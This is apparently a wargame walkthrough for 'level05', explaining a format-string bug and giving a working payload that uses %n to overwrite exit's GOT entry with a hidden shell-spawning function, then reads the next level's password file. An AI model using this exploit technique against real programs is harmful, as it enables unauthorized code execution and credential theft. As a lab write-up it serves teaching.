# level05 — walkthrough

## 1. Same bug as level04

`n()` reads our input with `fgets`, then does `printf(local_20c)` — our input is passed **directly as the format string** with no `"%s"`. So we can read the stack with `%x` and write memory with `%n`, exactly like level04.

The difference is what we attack. level04 flipped a variable to pass an `if`. level05 has a hidden function `o()` that runs `system("/bin/sh")` but is **never called** — and `n()` ends with `exit(1)` right after the `printf`. So instead of writing a magic number, we **hijack the `exit` call to jump into `o()`**.

## 2. The idea — hijack exit via the GOT

**GOT = Global Offset Table.** It's a table of addresses for shared-library functions (`exit`, `printf`, `fgets`, `system`...). When the program calls `exit`, it doesn't jump straight to libc — it looks up **one thing in the GOT: the address where the real `exit` lives** — and jumps there.

| Function ends with | How it leaves | What we overwrite |
|---|---|---|
| `exit(1)` (libc call) | jumps via its GOT entry | **exit's GOT entry** |

So the goal is simple: **swap the address in exit's GOT entry for the address of `o()`.** Then `printf` runs (and does our write), `exit(1)` runs right after, follows the poisoned pointer, and lands in `o()` → shell.

## 3. Gather the three pieces

**Find our buffer's slot** (walk the stack, look for `41414141`):
```
python -c 'print "AAAA" + ".%x"*4' | ./level5
```
`41414141` shows at field **4** → our buffer is argument **slot 4**.

**Find o()'s address** — the VALUE we want written:
```
objdump -t level5 | grep -w o
080484a4 g     F .text  0000001e  o          ->  o() = 0x080484a4
```

**Find exit's GOT entry** — the address we overwrite (the WHERE):
```
objdump -R level5 | grep exit
08049838 R_386_JUMP_SLOT   exit               ->  exit GOT = 0x08049838
```
(There's also `_exit` — that one is inside `o()`. We target `exit`, because that's what `n()` calls after the `printf`: `call <exit@plt>`.)

## 4. Build the payload

Three parts:

```
"\x38\x98\x04\x08"   +   "%134513824d"   +   "%4$n"
    WHERE                   padding            write
```

- **WHERE:** `0x08049838` (exit's GOT) in little-endian → lands in slot 4, so `%4$n` writes here.
- **padding → the VALUE:** `%n` writes *how many characters have been printed so far*, so to write o()'s address we must print exactly that many characters first.
  - o() = `0x080484a4` = **134513828** in decimal.
  - We already printed 4 characters (the address bytes at the front), so the padding supplies `134513828 - 4 = 134513824` → `%134513824d`.
  - Total printed = `4 + 134513824 = 134513828` = o()'s address.
- **`%4$n`:** writes that count (134513828 = o()'s address) into the address at slot 4 (exit's GOT).

## 5. Run it

```
(python -c 'print "\x38\x98\x04\x08" + "%134513824d" + "%4$n"'; cat) | ./level5
```

The `; cat` keeps stdin open so the spawned shell stays alive (level04 didn't need this — it just `cat`'d a file). Now `n()` reaches `exit(1)`, jumps through the poisoned GOT entry into `o()`, and we get a shell:
```
cat /home/user/level6/.pass
```

## Summary

Same format-string bug as level04. This time we don't write a value into a variable — we overwrite **exit's GOT entry** (`0x08049838`) with the **address of `o()`** (`0x080484a4`). The GOT holds the address `exit` jumps to; by replacing it with `o()`, the program's own `exit(1)` call carries us into `system("/bin/sh")`.